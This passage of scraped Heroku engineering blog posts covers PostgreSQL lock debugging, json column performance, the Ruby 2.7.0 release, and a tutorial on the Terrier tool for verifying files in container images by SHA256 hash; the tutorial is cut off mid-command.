L.granted\nFROM pg_stat_activity S\ninner join pg_locks L on S.pid = L.pid\norder by L.granted, L.pid DESC;\n-----------------------------------\npid      | 127624\nage      | 2 days 01:45:00.416267\nquery    | UPDATE \"table\" SET <values> WHERE (\"uuid\" = '<uuid>')\nmode     | AccessExclusiveLock\nlocktype | tuple\ngranted  | f I saw a ton of queries that were hung for quite some time, and most of them pointed to my seemingly teeny UPDATE statement. All about locks Up until this point, I basically knew nothing about how PostgreSQL uses locking other than in an explicit advisory lock, which can be used via a gem like pg_lock (That I maintain). Luckily Postgres has excellent docs around locks, but it's a bit much if you're new to the field: Postgresql Lock documentation Looking up the name of the lock from before Access Exclusive Lock I saw that it locks the whole table: ACCESS EXCLUSIVE\nConflicts with locks of all modes (ACCESS SHARE, ROW SHARE, ROW EXCLUSIVE, SHARE UPDATE EXCLUSIVE, SHARE, SHARE ROW EXCLUSIVE, EXCLUSIVE, and ACCESS EXCLUSIVE). This mode guarantees that the holder is the only transaction accessing the table in any way.\nAcquired by the DROP TABLE, TRUNCATE, REINDEX, CLUSTER, VACUUM FULL, and REFRESH MATERIALIZED VIEW (without CONCURRENTLY) commands. Many forms of ALTER TABLE also acquire a lock at this level (see ALTER TABLE). This is also the default lock mode for LOCK TABLE statements that do not specify a mode explicitly. From the docs, this lock is not typically triggered by an UPDATE , so what gives? Grepping through the docs showed me that an UPDATE should trigger a ROW SHARE lock: ROW EXCLUSIVE\nConflicts with the SHARE, SHARE ROW EXCLUSIVE, EXCLUSIVE, and ACCESS EXCLUSIVE lock modes.\n\nThe commands UPDATE, DELETE, and INSERT acquire this lock mode on the target table (in addition to ACCESS SHARE locks on any other referenced tables). In general, this lock mode will be acquired by any command that modifies data in a table. A database engineer directly told me what kind of lock an UPDATE should use, but you could find it in the docs if you don't have access to some excellent database professionals. Mostly what happens when you try to UPDATE is that Postgres will acquire a lock on the row that you want to change. If you have two update statements running at the same time on the same row, then the second must wait for the first to process. So why on earth, if an UPDATE is supposed only to take out a row lock, was my query taking out a lock against the whole table? Unmasking a locking mystery I would love to tell you that I have a really great debugging tool to tell you about here, but I mostly duck-duck-go-ed (searched) a ton and eventually found this forum post . In the post someone is complaining about a similar behavior, they're using an update but are seeing more aggressive lock being used sometimes. Based on the responses to the forum it sounded like if there is more than a few UPDATE queries that are trying to modify the same row at the same time what happens is that one of the queries will try to acquire the lock, see it is taken then it will instead acquire a larger lock on the table. Postgres queues locks, so if this happens for multiple rows with similar contention, then multiple queries would be taking out locks on the whole table, which somewhat could explain the behavior I was seeing. It seemed plausible, but why was there such a problem? I combed over my codebase and couldn't find anything. Then as I was laying down to go to bed that evening, I had a moment of inspiration where I remembered that we were updating the database in parallel for the same UUID using threads: @things.map do |thing|\n  Concurrent::Promise.execute(executor: :fast) do\n    store_results!(thing)\n  end\nend.each(&:value!) In every loop, we were creating a promise that would concurrently update values (using a thread pool). Due to a design decision from years ago, each loop causes an UPDATE to the same row in the database for each job being run. This programming pattern was never a problem before because, as I mentioned earlier, there's another table with more than 200x the number of records, so we've never had any issues with this scheme until recently. With this new theory, I removed the concurrency, which meant that each UPDATE call would be sequential instead of in parallel: @things.map do |thing|\n  store_results!(thing)\nend While the code is less efficiently in the use of IO on the Ruby program, it means that the chance that the same row will try to be updated at the same time is drastically decreased. I manually killed the long-running locked queries using SELECT pg_cancel_backend(<pid>); and I deployed this change (in the morning after a code review). Once the old stuck queries were aborted, and the new code was in place, then the system promptly got back up and running, churning through plenty of backlog. Locks and stuff While this somewhat obscure debugging story might not be directly relevant to your database, here are some things you can take away from this article. Your database has locks (think mutexes but with varying scope), and those locks can mess up your day if they're doing something different than you're expecting. You can see the locks that your database is currently using by running the heroku pg:locks command (may need to install the pg:extras plugin). You can also see which queries are taking out which locks using the SQL query I posted earlier. The next thing I want to cover is documentation. If it weren't for several very experienced Postgres experts and a seemingly random forum post about how multiple UPDATE statements can trigger a more aggressive lock type, then I never would have figured this out. If you're familiar with the Postgres documentation, is this behavior written down anywhere? If so, then could we make it easier to find or understand somehow? If it's not written down, can you help me document it? I don't mind writing documentation, but I'm not totally sure what the expected behavior is. For instance, why does a lock queue for a row that goes above a specific threshold trigger a table lock? And what exactly is that threshold? I'm sure this behavior makes total sense from an implementation point of view, but as an end-user, I would like it to be spelled out and officially documented. I hope you either learned a thing or two or at least got a kick out of my misery. This issue was a pain to debug, but in hindsight, a quirky bug to blog about. Thanks for reading! And to learn about another potential database issue, check out this other blog post by Heroku Engineer Ben Fritsch, Know Your Database Types . Special thanks to Matthew Blewitt and Andy Cooper for helping me debug this! postgresql database debugging", "date": "2019-12-18,"},
{"website": "Heroku", "title": "Know Your Database Types", "author": ["Ben Fritsch"], "link": "https://blog.heroku.com/know-your-database-types", "abstract": "Know Your Database Types Posted by Ben Fritsch December 18, 2019 Listen to this article This blog post is adapted from a lightning talk by Ben Fritsch at Ruby on Ice 2019. There can be a number of reasons why your application performs poorly, but perhaps none are as challenging as issues stemming from your database. If your database's response times tend to be high, it can cause a strain on your network and your users’ patience. The usual culprit for a slow database is an inefficient query being executed somewhere in your application logic. Usually, you can implement a fix in a number of common ways, by: reducing the amount of open locks (or more detail about database lock debugging in this other blog post by Heroku Engineer Richard Schneeman, The Curious Case of the Table-Locking UPDATE Query ) defining indexes for faster WHERE lookups rewriting the query to use more efficient statements ...But what if your problem isn't resolved by any of these actions? Let's talk about a problem that can occur from the underlying database schema, and how to solve it. The problem Consider this PostgreSQL database schema: CREATE TABLE table (\n  app_uuid uuid NOT NULL,\n  json_field json\n) Postgres lets you mark a column's data type as json . This, as opposed to simply unstructured text , allows for more flexible querying and data validation. As part of our application’s behavior, we receive and store payloads that look like this: {\"data\": \"very large string\", \"url\": \"https://heroku.com\"} If I want to fetch the url values for a specific app_uuid , I would write a query like this: SELECT (table.large_json_field ->> 'url'::text) AS url,\nFROM table\nWHERE (\"app_uuid\" = $app_uuid)\nORDER BY  \"created_at\" DESC LIMIT 200; The average execution time of this query was 10ms, although there were outliers reaching as high as 1200ms. This was becoming unacceptable, and I dug in to see exactly what was going on. The investigation If you need to look into slow queries, the EXPLAIN ANALYZE statement is a good place to start. It will provide you with some internal metrics about how your query is planned and executed. I learned that there is also the option to use EXPLAIN (ANALYZE, BUFFERS) , which looks like this: EXPLAIN (ANALYZE, BUFFERS)\nSELECT (table.large_json_field ->> 'url'::text) AS url,\nFROM table\nWHERE (\"app_uuid\" = $app_uuid)\nORDER BY  \"created_at\" DESC LIMIT 200; BUFFERS provides stats on the I/O subsystem of Postgres, identifying whether information is being loaded from cache (memory) or directly from disk. It is much slower for Postgres to read data outside of the cache. The result of that informative query was the following information: ->   Index Cond: (app_uuid = $app_uuid::uuid)\n        Buffers: shared hit=7106\n\nPlanning time: 0.187 ms\nExecution time: 1141.296 ms By default, Postgres has a block size of 8kb . According to the Postgres planner, the query to fetch a url key uses over 7,100 blocks, which means that we've loaded (and discarded) about 60MB of JSON data (7,106 * 8kb), just to fetch the URLs we wanted. Even though the query took less than a millisecond to plan, it takes over a second to execute! The solution The fix for this is simple and direct. Rather than relying on a single json column, I converted it into two separate text fields: one for data and one for url . This brought the query time down from 1200ms to 10ms as we were able to scope our query to the exact piece of information we needed. We realized that in this use case, storing JSON was no longer a requirement for us. When we started building this feature about three or four years ago, a json data type was the best choice we had, given the information we had. Our system hasn't changed, but our understanding of how the system was being used did. We had been storing the same JSON structure for years, but we were essentially storing unstructured data in our database. As a result of our database design, reading information became expensive for queries which only required a small piece of information. I encourage you to audit your database schema for columns with data types that are no longer necessary. As our application and knowledge of users' behaviors evolves, so too should our database structure. Of course, don't change tables just for the sake of changing something! We were able to continue operating with this problem for years without any tremendous strain on our systems. If it's not a problem, don't fix it. Want to learn more about Postgres? Check out another article we wrote on dev.to: Postgres Is Underrated—It Handles More than You Think .", "date": "2019-12-18,"},
{"website": "Heroku", "title": "Ruby 2.7.0 Holiday Release", "author": ["Richard Schneeman"], "link": "https://blog.heroku.com/ruby-2-7-0-holiday-release", "abstract": "Ruby 2.7.0 Holiday Release Posted by Richard Schneeman December 25, 2019 Listen to this article When Heroku launched in 2007 there was only a single Ruby version that could be used on the platform. In 2012 Heroku began to support multiple Ruby versions . Since then, we've had a holiday tradition of releasing the new versions of Ruby on the same day they come out, which always happens on Christmas day (December 25th). If you're new to the community, you might be curious about where releasing a new minor version on Christmas comes from. To help answer that question, we interviewed Matz's, who works as the Chief Ruby Architect at Heroku in 2015. In his own words: Ruby was originally my pet project, my side project. So releases usually happened during my holiday time. Now, it’s a tradition. It’s ruby-core’s gift to the Ruby community. This year, it's my second opportunity to curl up with a cup of cocoa and help spread Ruby cheer to Heroku customers. As of publishing this article, you can now Ruby 2.7.0 is generally available on the platform. To use it put this in your Gemfile: ruby '2.7.0' Commit to git, push your code, and enjoy a happy holiday season from all of us at Heroku. What's new in 2.7.0? You can hear directly for yourself from Matz in his 2019 RubyConf keynote: There's a ton of new features, and other sites have done a great job summarizing: RubyLang's 2.7.0 release announcement Saeloun's What's new in Ruby 2.7 Prathamesh's What's new in Ruby 2.7 Ruby Guide's What's new in Ruby 2.7 The largest new feature looks to be pattern matching: RubyConf 2019 video on Pattern Matching And the biggest change to existing projects is likely to be that some use of keyword arguments has been deprecated in anticipation of the coming Ruby 3.0 release: Deprecation of some keword argument usage matz release 2.7.0 christmas ruby", "date": "2019-12-25,"},
{"website": "Heroku", "title": "Terrier: An Open-Source Tool for Identifying and Analyzing Container and Image Components", "author": ["chris le roy"], "link": "https://blog.heroku.com/terrier-open-source-identifying-analyzing-containers", "abstract": "Terrier: An Open-Source Tool for Identifying and Analyzing Container and Image Components Posted by chris le roy January 14, 2020 Listen to this article As part of our Blackhat Europe talk “Reverse Engineering and Exploiting Builds in the Cloud” we publicly released a new tool called Terrier. Announcing Terrier: An open-source tool for identifying and analysing container and image components. In this blog post, I am going to show you how Terrier can help you identify and verify container and image components for a wide variety of use-cases, be it from a supply-chain perspective or forensics perspective. Terrier can be found on Github https://github.com/heroku/terrier . Containers and images In this blog post, I am not going to go into too much detail about containers and images (you can learn more here ) however it is important to highlight a few characteristics of containers and images that make them interesting in terms of Terrier. Containers are run from images and currently the Open Containers Initiative (OCI) is the most popular format for images. The remainder of this blog post refers to OCI images as images. Essentially images are tar archives that container multiple tar archives and meta-information that represent the “layers” of an image. The OCI format of images makes images relatively simple to work with which makes analysis relatively simple. If you only had access to a terminal and the tar command, you could pretty much get what you need from the image’s tar archive. When images are utilised at runtime for a container, their contents become the contents of the running container and the layers are essentially extracted to a location on the container’s runtime host. The container runtime host is the host that is running and maintaining the containers. This location is typically /var/lib/docker/overlay2/<containerID>/ . This location contains a few folders of interest, particularly the \"merged\" folder. The \"merged\" folder contains the contents of the image and any changes that have occurred in the container since its creation. For example, if the image contained a location such as /usr/chris/stuff and after creating a container from this image I created a file called helloworld.txt at the location /usr/chris/stuff . This would result in the following valid path on the container runtime host /var/lib/docker/overlay2/<containerID>/merged/usr/chris/stuff/helloworld.txt . What does Terrier do? Now that we have a brief understanding of images and containers, we can look at what Terrier does. Often it is the case that you would like to determine if an image or container contains a specific file. This requirement may be due to a forensic analysis need or to identify and prevent a certain supply-chain attack vector. Regardless of the requirement, having the ability to determine the presence of a specific file in an image or container is useful. Identifying files in OCI images Terrier can be used to determine if a specific image contains a specific file. In order to do this, you need the following: An OCI Image i.e TAR archive A SHA256 hash of a specific file/s The first point can be easily achieved with Docker by using the following command: $ docker save imageid -o myImage.tar The command above uses a Docker image ID which can be obtained using the following command: $ docker images Once you have your image exported as a tar archive, you will then need to establish the SHA256 hash of the particular file you would like to identify in the image. There are multiple ways to achieve this but in this example, we are going to use the hash of the Golang binary go1.13.4 linux/amd64 which can be achieved with following command on a Linux host: $ cat /usr/local/go/bin/go | sha256sum The command above should result in the following SHA256 hash: 82bce4b98d7aaeb4f841a36f7141d540bb049f89219f9e377245a91dd3ff92dd Now that we have a hash, we can use this hash to determine if the Golang binary is in the image myImage.tar . To achieve this, we need to populate a configuration file for Terrier. Terrier makes use of YAML configuration files and below is our config file that we save as cfg.yml : mode: image\nimage: myImage.tar\n\nhashes:\n    - hash: '82bce4b98d7aaeb4f841a36f7141d540bb049f89219f9e377245a91dd3ff92dd' The config file above has multiple entries which allow us to specify the mode that Terrier will operate in and in this case, we are working with an image file (tar archive) so the mode is image . The image file we are working with is myImage.tar and the hash we are looking to identify is in the hashes list. We are now ready to run Terrier and this can be done with the following command: $ ./terrier The command above should result in output similar to the following: $ ./terrier \n[+] Loading config:  cfg.yml\n[+] Analysing Image\n[+] Docker Image Source:  myImage.tar\n[*] Inspecting Layer:  34a9e0f17132202a82565578a3c2dae1486bb198cde76928c8c2c5c461e11ccf\n[*] Inspecting Layer:  6539a80dd09da08132a525494ff97e92f4148d413e7c48b3583883fda8a40560\n[*] Inspecting Layer:  6d2d61c78a65b6e6c82b751a38727da355d59194167b28b3f8def198cd116759\n[!] Found file '6d2d61c78a65b6e6c82b751a38727da355d59194167b28b3f8def198cd116759/usr/local/go/bin/go' with hash: 82bce4b98d7aaeb4f841a36f7141d540bb049f89219f9e377245a91dd3ff92dd\n[*] Inspecting Layer:  a6e646c34d2d2c2f4ab7db95e4c9f128721f63c905f107887839d3256f1288e1\n[*] Inspecting Layer:  aefc8f0c87a14230e30e510915cbbe13ebcabd611e68db02b050b6ceccf9c545\n[*] Inspecting Layer:  d4468fff8d0f28d87d48f51fc0a6afd4b38946bbbe91480919ebfdd55e43ce8c\n[*] Inspecting Layer:  dbf9da5e4e5e1ecf9c71452f6b67b2b0225cec310a20891cc5dedbfd4ead667c We have identified a file /usr/local/go/bin/go located at layer 6d2d61c78a65b6e6c82b751a38727da355d59194167b28b3f8def198cd116759 that has the same SHA256 hash as the one we provided. We now have verification that the image “myImage.tar” contains a file with the SHA256 hash we provided. This example can be extended upon and you can instruct Terrier to search for multiple hashes. In this case, we are going to search for a malicious file. Recently a malicious Python library was identified in the wild and went by the name “Jeilyfish”. Terrier could be used to check if a Docker image of yours contained this malicious package. To do this, we can determine the SHA256 of one of the malicious Python files that contains the backdoor: $ cat jeIlyfish-0.7.1/jeIlyfish/_jellyfish.py | sha256sum\ncf734865dd344cd9b0b349cdcecd83f79a751150b5fd4926f976adddb93d902c We then update our Terrier config to include the hash calculated above. mode: image\nimage: myImage.tar\n\nhashes:\n    - hash: '82bce4b98d7aaeb4f841a36f7141d540bb049f89219f9e377245a91dd3ff92dd'\n    - hash: 'cf734865dd344cd9b0b349cdcecd83f79a751150b5fd4926f976adddb93d902c' We then run Terrier against and analyse the results: $ ./terrier \n[+] Loading config:  cfg.yml\n[+] Analysing Image\n[+] Docker Image Source:  myImage.tar\n[*] Inspecting Layer:  34a9e0f17132202a82565578a3c2dae1486bb198cde76928c8c2c5c461e11ccf\n[*] Inspecting Layer:  6539a80dd09da08132a525494ff97e92f4148d413e7c48b3583883fda8a40560\n[*] Inspecting Layer:  6d2d61c78a65b6e6c82b751a38727da355d59194167b28b3f8def198cd116759\n[!] Found file '6d2d61c78a65b6e6c82b751a38727da355d59194167b28b3f8def198cd116759/usr/local/go/bin/go' with hash: 82bce4b98d7aaeb4f841a36f7141d540bb049f89219f9e377245a91dd3ff92dd\n[*] Inspecting Layer:  a6e646c34d2d2c2f4ab7db95e4c9f128721f63c905f107887839d3256f1288e1\n[*] Inspecting Layer:  aefc8f0c87a14230e30e510915cbbe13ebcabd611e68db02b050b6ceccf9c545\n[*] Inspecting Layer:  d4468fff8d0f28d87d48f51fc0a6afd4b38946bbbe91480919ebfdd55e43ce8c\n[*] Inspecting Layer:  dbf9da5e4e5e1ecf9c71452f6b67b2b0225cec310a20891cc5dedbfd4ead667c The results above indicate that our image did not contain the malicious Python package. There is no limit as to how many hashes you can search for however it should be noted that Terrier performs all its actions in-memory for performance reasons so you might hit certain limits if you do not have enough accessible memory. Identifying and verifying specific files in OCI images Terrier can also be used to determine if a specific image contains a specific file at a specific location . This can be useful to ensure that an image is using a specific component i.e binary, shared object or dependency.  This can also be seen as “pinning” components by ensuring that you are images are using specific components i.e a specific version of cURL. In order to do this, you need the following: An OCI Image i.e TAR archive A SHA256 hash of a specific file/s The path and name of the specific file/s The first point can be easily achieved with Docker by using the following command: $ docker save imageid -o myImage.tar The command above utilises a Docker image id which can be obtained using the following command: $ docker images Once you have your image exported as a tar archive, you will need to determine the path of the file you would like to identify and verify in the image. For example, if we would like to ensure that our images are making use of a specific version of cURL, we can run the following commands in a container or some other environment that resembles the image. $ which curl\n/usr/bin/curl We now have the path to cURL and can now generate the SHA256 of this instance of cURL because in this case, we trust this instance of cURL. We could determine the hash by other means for example many binaries are released with a corresponding hash from the developer which can be acquired from the developer’s website. $ cat /usr/bin/curl | sha256sum \n9a43cb726fef31f272333b236ff1fde4beab363af54d0bc99c304450065d9c96 With this information, we can now populate our config file for Terrier: mode: image\nimage: myImage.tar\nfiles:\n  - name: '/usr/bin/curl'\n    hashes:\n      - hash: '9a43cb726fef31f272333b236ff1fde4beab363af54d0bc99c304450065d9c96' We’ve saved the above config as cfg.yml and when we run Terrier with this config, we get the following output: $ ./terrier\n[+] Loading config:  cfg.yml\n[+] Analysing Image\n[+] Docker Image Source:  myImage.tar\n[*] Inspecting Layer:  34a9e0f17132202a82565578a3c2dae1486bb198cde76928c8c2c5c461e11ccf\n[*] Inspecting Layer:  34a9e0f17132202a82565578a3c2dae1486bb198cde76928c8c2c5c461e11ccf\n[*] Inspecting Layer:  6539a80dd09da08132a525494ff97e92f4148d413e7c48b3583883fda8a40560\n[*] Inspecting Layer:  6539a80dd09da08132a525494ff97e92f4148d413e7c48b3583883fda8a40560\n[*] Inspecting Layer:  6d2d61c78a65b6e6c82b751a38727da355d59194167b28b3f8def198cd116759\n[*] Inspecting Layer:  6d2d61c78a65b6e6c82b751a38727da355d59194167b28b3f8def198cd116759\n[*] Inspecting Layer:  a6e646c34d2d2c2f4ab7db95e4c9f128721f63c905f107887839d3256f1288e1\n[*] Inspecting Layer:  a6e646c34d2d2c2f4ab7db95e4c9f128721f63c905f107887839d3256f1288e1\n[*] Inspecting Layer:  aefc8f0c87a14230e30e510915cbbe13ebcabd611e68db02b050b6ceccf9c545\n[*] Inspecting Layer:  aefc8f0c87a14230e30e510915cbbe13ebcabd611e68db02b050b6ceccf9c545\n[*] Inspecting Layer:  d4468fff8d0f28d87d48f51fc0a6afd4b38946bbbe91480919ebfdd55e43ce8c\n[*] Inspecting Layer:  d4468fff8d0f28d87d48f51fc0a6afd4b38946bbbe91480919ebfdd55e43ce8c\n[*] Inspecting Layer:  dbf9da5e4e5e1ecf9c71452f6b67b2b0225cec310a20891cc5dedbfd4ead667c\n[*] Inspecting Layer:  dbf9da5e4e5e1ecf9c71452f6b67b2b0225cec310a20891cc5dedbfd4ead667c\n[!] All components were identified: (1/1)\n[!] All components were identified and verified: (1/1)\n$ echo $?\n0 The output above indicates that the file /usr/bin/curl was successfully identified and verified, meaning that the image contained a file at the location /usr/bin/curl and that the SHA256 of that file matched the hash we provided in the config. Terrier also makes use of return codes and if we analyse the return code from the output above, we can see that the value is 0 which indicates a success. If Terrier cannot identify or verify all the provided files, a return code of 1 is returned which indicates a failure. The setting of return codes is particularly useful in testing environments or CI/CD environments. We can also run Terrier with verbose mode enable to get more information: $ ./terrier \n[+] Loading config:  cfg.yml\n[+] Analysing Image\n[+] Docker Image Source:  myImage.tar\n[*] Inspecting Layer:  34a9e0f17132202a82565578a3c2dae1486bb198cde76928c8c2c5c461e11ccf\n[*] Inspecting Layer:  6539a80dd09da08132a525494ff97e92f4148d413e7c48b3583883fda8a40560\n        [!] Identified  instance of '/usr/bin/curl' at: 6539a80dd09da08132a525494ff97e92f4148d413e7c48b3583883fda8a40560/usr/bin/curl \n        [!] Verified matching instance of '/usr/bin/curl' at: 6539a80dd09da08132a525494ff97e92f4148d413e7c48b3583883fda8a40560/usr/bin/curl with hash: 9a43cb726fef31f272333b236ff1fde4beab363af54d0bc99c304450065d9c96\n[*] Inspecting Layer:  6d2d61c78a65b6e6c82b751a38727da355d59194167b28b3f8def198cd116759\n[*] Inspecting Layer:  a6e646c34d2d2c2f4ab7db95e4c9f128721f63c905f107887839d3256f1288e1\n[*] Inspecting Layer:  aefc8f0c87a14230e30e510915cbbe13ebcabd611e68db02b050b6ceccf9c545\n[*] Inspecting Layer:  d4468fff8d0f28d87d48f51fc0a6afd4b38946bbbe91480919ebfdd55e43ce8c\n[*] Inspecting Layer:  dbf9da5e4e5e1ecf9c71452f6b67b2b0225cec310a20891cc5dedbfd4ead667c\n[!] All components were identified: (1/1)\n[!] All components were identified and verified: (1/1) The output above provides some more detailed information such as which layer the cURL files was located at. If you wanted more information, you could enable the veryveryverbose option in the config file but beware, this is a lot of output and grep will be your friend. There is no limit for how many hashes you can specify for a file. This can be useful for when you want to allow more than one version of a specific file i.e multiple versions of cURL. An example config of multiple hashes for a file might look like: mode: image\nimage: myImage.tar\nfiles:\n  - name: '/usr/bin/curl'\n    hashes:\n      - hash: '9a43cb726fef31f272333b236ff1fde4beab363af54d0bc99c304450065d9c96'\n      - hash: 'aefc8f0c87a14230e30e510915cbbe13ebcabd611e68db02b050b6ceccf9c545'\n      - hash: '6d2d61c78a65b6e6c82b751a38727da355d59194167b28b3f8def198cd116759'\n      - hash: 'd4468fff8d0f28d87d48f51fc0a6afd4b38946bbbe91480919ebfdd55e43ce8c' The config above allows Terrier to verify if the identified cURL instance is one of the provided hashes. There is also no limit for the amount of files Terrier can attempt to identify and verify. Terrier’s Github repo also contains a useful script called convertSHA.sh which can be used to convert a list of SHA256 hashes and filenames into a Terrier config file. This is useful when converting the output from other tools into a Terrier friendly format. For example, we could have the following contents of a file: 8946690bfe12308e253054ea658b1552c02b67445763439d1165c512c4bc240d ./bin/uname\n6de8254cfd49543097ae946c303602ffd5899b2c88ec27cfcd86d786f95a1e92 ./bin/gzexe\n74ff9700d623415bc866c013a1d8e898c2096ec4750adcb7cd0c853b4ce11c04 ./bin/wdctl\n61c779de6f1b9220cdedd7dfee1fa4fb44a4777fff7bd48d12c21efb87009877 ./bin/dmesg\n7bdde142dc5cb004ab82f55adba0c56fc78430a6f6b23afd33be491d4c7c238b ./bin/which\n3ed46bd8b4d137cad2830974a78df8d6b1d28de491d7a23d305ad58742a07120 ./bin/mknod\ne8ca998df296413624b2bcf92a31ee3b9852f7590f759cc4a8814d3e9046f1eb ./bin/mv\na91d40b349e2bccd3c5fe79664e70649ef0354b9f8bd4658f8c164f194b53d0f ./bin/chown\n091abe52520c96a75cf7d4ff38796fc878cd62c3a75a3fd8161aa3df1e26bebd ./bin/uncompress\nc5ebd611260a9057144fd1d7de48dbefc14e16240895cb896034ae05a94b5750 ./bin/echo\nd4ba9ffb5f396a2584fec1ca878930b677196be21aee16ee6093eb9f0a93bf8f ./bin/df\n5fb515ff832650b2a25aeb9c21f881ca2fa486900e736dfa727a5442a6de83e5 ./bin/tar\n6936c9aa8e17781410f286bb1cbc35b5548ea4e7604c1379dc8e159d91a0193d ./bin/zforce\n8d641329ea7f93b1caf031b70e2a0a3288c49a55c18d8ba86cc534eaa166ec2e ./bin/gzip\n0c1a1f53763ab668fb085327cdd298b4a0c1bf2f0b51b912aa7bc15392cd09e7 ./bin/su\n20c358f7ee877a3fd2138ecce98fada08354810b3e9a0e849631851f92d09cc4 ./bin/bzexe\n01764d96697b060b2a449769073b7cf2df61b5cb604937e39dd7a47017e92ee0 ./bin/znew\n0d1a106dc28c3c41b181d3ba2fc52086ede4e706153e22879e60e7663d2f6aad ./bin/login\nfb130bda68f6a56e2c2edc3f7d5b805fd9dcfbcc26fb123a693b516a83cfb141 ./bin/dir\n0e7ca63849eebc9ea476ea1fefab05e60b0ac8066f73c7d58e8ff607c941f212 ./bin/bzmore\n14dc8106ec64c9e2a7c9430e1d0bef170aaad0f5f7f683c1c1810b466cdf5079 ./bin/zless\n9cf4cda0f73875032436f7d5c457271f235e59c968c1c101d19fc7bf137e6e37 ./bin/chmod\nc5f12f157b605b1141e6f97796732247a26150a0a019328d69095e9760b42e38 ./bin/sleep\nb9711301d3ab42575597d8a1c015f49fddba9a7ea9934e11d38b9ff5248503a8 ./bin/zfgrep\n0b2840eaf05bb6802400cc5fa793e8c7e58d6198334171c694a67417c687ffc7 ./bin/stty\nd9393d0eca1de788628ad0961b74ec7a648709b24423371b208ae525f60bbdad ./bin/bunzip2\nd2a56d64199e674454d2132679c0883779d43568cd4c04c14d0ea0e1307334cf ./bin/mkdir\n1c48ade64b96409e6773d2c5c771f3b3c5acec65a15980d8dca6b1efd3f95969 ./bin/cat\n09198e56abd1037352418279eb51898ab71cc733642b50bcf69d8a723602841e ./bin/true\n97f3993ead63a1ce0f6a48cda92d6655ffe210242fe057b8803506b57c99b7bc ./bin/zdiff\n0d06f9724af41b13cdacea133530b9129a48450230feef9632d53d5bbb837c8c ./bin/ls\nda2da96324108bbe297a75e8ebfcb2400959bffcdaa4c88b797c4d0ce0c94c50 ./bin/zegrep The file contents above are trusted SHA256 hashes for specific files. If we would like to use this list for ensuring that a particular image is making use of the files listed above, we can do the following: $ ./convertSHA.sh trustedhashes.txt terrier.yml The script above takes the input file trustedhashes.txt which contains our trusted hashes listed above and converts them into a Terrier friendly config file called terrier.yml which looks like the following: mode: image\nimage: myImage.tar\nfiles:\n  - name: '/bin/uname'\n    hashes:\n       - hash: '8946690bfe12308e253054ea658b1552c02b67445763439d1165c512c4bc240d'\n  - name: '/bin/gzexe'\n    hashes:\n       - hash: '6de8254cfd49543097ae946c303602ffd5899b2c88ec27cfcd86d786f95a1e92'\n  - name: '/bin/wdctl'\n    hashes:\n       - hash: '74ff9700d623415bc866c013a1d8e898c2096ec4750adcb7cd0c853b4ce11c04'\n  - name: '/bin/dmesg'\n    hashes:\n       - hash: '61c779de6f1b9220cdedd7dfee1fa4fb44a4777fff7bd48d12c21efb87009877'\n  - name: '/bin/which'\n    hashes:\n       - hash: '7bdde142dc5cb004ab82f55adba0c56fc78430a6f6b23afd33be491d4c7c238b'\n  - name: '/bin/mknod' The config file terrier.yml is ready to be used: $ ./terrier -cfg=terrier.yml\n[+] Loading config:  terrier.yml\n[+] Analysing Image\n[+] Docker Image Source:  myImage.tar\n[*] Inspecting Layer:  34a9e0f17132202a82565578a3c2dae1486bb198cde76928c8c2c5c461e11ccf\n[*] Inspecting Layer:  6539a80dd09da08132a525494ff97e92f4148d413e7c48b3583883fda8a40560\n[*] Inspecting Layer:  6d2d61c78a65b6e6c82b751a38727da355d59194167b28b3f8def198cd116759\n[*] Inspecting Layer:  a6e646c34d2d2c2f4ab7db95e4c9f128721f63c905f107887839d3256f1288e1\n[*] Inspecting Layer:  aefc8f0c87a14230e30e510915cbbe13ebcabd611e68db02b050b6ceccf9c545\n[*] Inspecting Layer:  d4468fff8d0f28d87d48f51fc0a6afd4b38946bbbe91480919ebfdd55e43ce8c\n[*] Inspecting Layer:  dbf9da5e4e5e1ecf9c71452f6b67b2b0225cec310a20891cc5dedbfd4ead667c\n[!] Not all components were identifed: (4/31)\n[!] Component not identified:  /bin/uncompress\n[!] Component not identified:  /bin/bzexe\n[!] Component not identified:  /bin/bzmore\n[!] Component not identified:  /bin/bunzip2\n$ echo $?\n1 As we can see from the output above, Terrier was unable to identify 4/31 of the components provided in the config. The return code is also 1 which indicates a failure. If we were to remove the components that are not in the provided image, the output from the previous command would look like the following: $ ./terrier -cfg=terrier.yml\n[+] Loading config: terrier.yml\n[+] Analysing Image\n[+] Docker Image Source: myImage.tar\n[*] Inspecting Layer: 34a9e0f17132202a82565578a3c2dae1486bb198cde76928c8c2c5c461e11ccf\n[*] Inspecting Layer: 6539a80dd09da08132a525494ff97e92f4148d413e7c48b3583883fda8a40560\n[*] Inspecting Layer: 6d2d61c78a65b6e6c82b751a38727da355d59194167b28b3f8def198cd116759\n[*] Inspecting Layer: a6e646c34d2d2c2f4ab7db95e4c9f128721f63c905f107887839d3256f1288e1\n[*] Inspecting Layer: aefc8f0c87a14230e30e510915cbbe13ebcabd611e68db02b050b6ceccf9c545\n[*] Inspecting Layer: d4468fff8d0f28d87d48f51fc0a6afd4b38946bbbe91480919ebfdd55e43ce8c\n[*] Inspecting Layer: dbf9da5e4e5e1ecf9c71452f6b67b2b0225cec310a20891cc5dedbfd4ead667c\n[!] All components were identified: (27/27)\n[!] Not all components were verified: (26/27)\n[!] Component not verified: /bin/cat\n[!] Component not verified: /bin/chmod\n[!] Component not verified: /bin/chown\n[!] Component not verified: /bin/df\n[!] Component not verified: /bin/dir\n[!] Component not verified: /bin/dmesg\n[!] Component not verified: /bin/echo\n[!] Component not verified: /bin/gzexe\n[!] Component not verified: /bin/gzip\n[!] Component not verified: /bin/login\n[!] Component not verified: /bin/ls\n[!] Component not verified: /bin/mkdir\n[!] Component not verified: /bin/mknod\n[!] Component not verified: /bin/mv\n[!] Component not verified: /bin/sleep\n[!] Component not verified: /bin/stty\n[!] Component not verified: /bin/su\n[!] Component not verified: /bin/tar\n[!] Component not verified: /bin/true\n[!] Component not verified: /bin/uname\n[!] Component not verified: /bin/wdctl\n[!] Component not verified: /bin/zdiff\n[!] Component not verified: /bin/zfgrep\n[!] Component not verified: /bin/zforce\n[!] Component not verified: /bin/zless\n[!] Component not verified: /bin/znew\n$ echo $?\n1 The output above indicates that Terrier was able to identify all the components provided but many were not verifiable, the hashes did not match and once again, the return code is 1 to indicate this failure. Identifying files in containers The previous sections focused on identifying files in images, which can be referred to as a form of “static analysis,” however it is also possible to perform this analysis to running containers. In order to do this, you need the following: Location of the container’s merged folder A SHA256 hash of a specific file/s The merged folder is Docker specific, in this case, we are using it because this is where the contents of the Docker container reside, this might be another location if it were LXC. The location of the container’s merged folder can be determined by running the following commands. First obtain the container’s ID: $ docker 